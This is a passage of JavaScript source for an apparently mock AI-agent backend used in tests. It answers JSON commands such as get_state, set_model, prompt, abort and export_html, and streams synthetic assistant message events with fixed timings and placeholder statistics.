		run.assembled += firstDelta;
		const partial = assistantMessage(run.assembled);
		send({
			type: "message_update",
			usage: partial.usage,
			assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: firstDelta },
		});
		record("delta", { commandId: command.id, text, deltaIndex: 1 });
	});

	const finish = () => {
		run.assembled += finalDelta;
		const partial = assistantMessage(run.assembled);
		send({
			type: "message_update",
			usage: partial.usage,
			assistantMessageEvent: { type: "text_delta", contentIndex: 0, delta: finalDelta },
		});
		const final = assistantMessage(label);
		send({ type: "message_end", message: final });
		send({ type: "turn_end", message: final, toolResults: [] });
		messages.push(final);
		persistMessage(final, run.userEntryId);
		send({ type: "agent_end", messages: [user, final], willRetry: false });
		send({ type: "agent_settled" });
		record("settled", { commandId: command.id, text, label });
		activeRun = null;
	};
	if (slow) scheduleSlowFinish(run, text, finish);
	else schedule(run, finishDelay, finish);
}

function abortRun(command) {
	const run = activeRun;
	if (!run) {
		respond(command);
		return;
	}
	clearRunTimers(run);
	const final = { ...assistantMessage(run.assembled), stopReason: "aborted" };
	send({ type: "message_end", message: final });
	send({ type: "turn_end", message: final, toolResults: [] });
	send({ type: "agent_end", messages: [], willRetry: false });
	send({ type: "agent_settled" });
	record("aborted", { commandId: run.command.id });
	activeRun = null;
	respond(command);
}

function handleLine(line) {
	let command;
	try {
		command = JSON.parse(line);
	} catch {
		return;
	}
	if (!command || typeof command !== "object" || typeof command.type !== "string") return;
	if (typeof command.id !== "string") return;
	if (command.type === "extension_ui_response") {
		finishExtensionPrompt(command);
		return;
	}

	record("command", { commandId: command.id, commandType: command.type });
	switch (command.type) {
		case "get_state": {
			const state = {
				sessionId,
				sessionFile,
				model: currentModel,
				thinkingLevel,
				isStreaming: activeRun !== null,
				isCompacting: false,
				steeringMode: "all",
				followUpMode: "all",
				autoCompactionEnabled: true,
				messageCount: messages.length,
				pendingMessageCount: 0,
			};
			if (requestedFile && existingStateDelayMs > 0 && !delayedExistingState) {
				delayedExistingState = true;
				setTimeout(() => respond(command, state), existingStateDelayMs);
				return;
			}
			respond(command, state);
			return;
		}
		case "get_commands":
			respond(command, {
				commands: recoveryFeatures
					? [
							{
								name: "review",
								description: "Review the current implementation",
								source: "prompt",
								sourceInfo: { path: "/synthetic/review.md" },
							},
							{
								name: "skill:e2e",
								description: "Synthetic acceptance skill",
								source: "skill",
								sourceInfo: { path: "/synthetic/e2e/SKILL.md" },
							},
						]
					: [],
			});
			return;
		case "get_available_models":
			respond(command, { models });
			return;
		case "get_available_thinking_levels":
			respond(command, { levels: recoveryFeatures ? ["off", "low", "medium", "high"] : ["off"] });
			return;
		case "set_model": {
			const selected = models.find(
				(model) => model.provider === command.provider && model.id === command.modelId,
			);
			if (selected) currentModel = selected;
			respond(command, currentModel);
			return;
		}
		case "set_thinking_level":
			thinkingLevel = command.level;
			send({ type: "thinking_level_changed", level: thinkingLevel });
			respond(command);
			return;
		case "get_messages":
			respond(command, { messages });
			return;
		case "get_fork_messages":
			respond(command, { messages: forkMessages() });
			return;
		case "get_tree":
			respond(command, conversationTree());
			return;
		case "get_session_stats":
			respond(command, {
				sessionId,
				sessionFile,
				userMessages: messages.filter((message) => message.role === "user").length,
				assistantMessages: messages.filter((message) => message.role === "assistant").length,
				toolCalls: messages.reduce(
					(count, message) =>
						count +
						(message.role === "assistant"
							? message.content.filter((content) => content.type === "toolCall").length
							: 0),
					0,
				),
				toolResults: messages.filter((message) => message.role === "toolResult").length,
				totalMessages: messages.length,
				tokens: recoveryFeatures
					? { input: 32_000, output: 12_000, cacheRead: 0, cacheWrite: 0, total: 44_000 }
					: { input: 1, output: 1, cacheRead: 0, cacheWrite: 0, total: 2 },
				cost: 0,
				contextUsage: recoveryFeatures
					? { tokens: 44_000, contextWindow: 128_000, percent: 34.375 }
					: { tokens: null, contextWindow: 128_000, percent: null },
			});
			return;
		case "export_html": {
			const outputPath =
				typeof command.outputPath === "string" ? command.outputPath : `exports/会话 #${sessionId}.html`;
			const resolved = path.resolve(outputPath);
			fs.mkdirSync(path.dirname(resolved), { recursive: true });
			fs.writeFileSync(resolved, "<html><body>deterministic export</body></html>\n", "utf8");
			respond(command, { path: outputPath });
			return;
		}
		case "fork":
			forkSession(command);
			return;
		case "prompt":
		case "steer":
		case "follow_up":
			streamPrompt(command);
			return;
		case "abort":
			abortRun(command);
			return;
		default:
			respond(command);
	}
}
